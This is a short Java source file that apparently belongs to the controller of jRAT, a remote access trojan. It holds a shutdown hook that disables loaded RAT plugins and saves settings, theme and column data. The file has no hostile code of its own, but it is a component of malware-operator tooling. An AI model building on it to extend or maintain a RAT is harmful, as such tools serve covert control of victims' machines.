package se.jrat.controller;

import jrat.api.RATPlugin;
import jrat.api.events.OnDisableEvent;
import se.jrat.controller.addons.PluginLoader;
import se.jrat.controller.settings.AbstractStoreable;
import se.jrat.controller.settings.Settings;
import se.jrat.controller.settings.SettingsColumns;
import se.jrat.controller.settings.SettingsTheme;

public class ShutdownHook implements Runnable {

	@Override
	public void run() {
		Main.debug("Shutting down...");
		
		OnDisableEvent event = new OnDisableEvent();
		for (RATPlugin p : PluginLoader.getPlugins()) {
			try {
				p.onDisable(event);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		AbstractStoreable.saveAllGlobals();

		try {
			SettingsTheme.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}

		try {
			Settings.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}

		try {
			SettingsColumns.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
